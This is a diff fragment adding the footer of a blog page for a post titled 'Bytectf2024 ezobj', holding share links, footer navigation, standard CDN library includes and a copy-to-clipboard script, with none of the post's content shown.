+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&title=Bytectf2024 ezobj"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&title=Bytectf2024 ezobj"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&title=Bytectf2024 ezobj"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&title=Bytectf2024 ezobj"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&name=Bytectf2024 ezobj&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/10/05/Bytectf2024-ezobj/&t=Bytectf2024 ezobj"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    k1ato
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
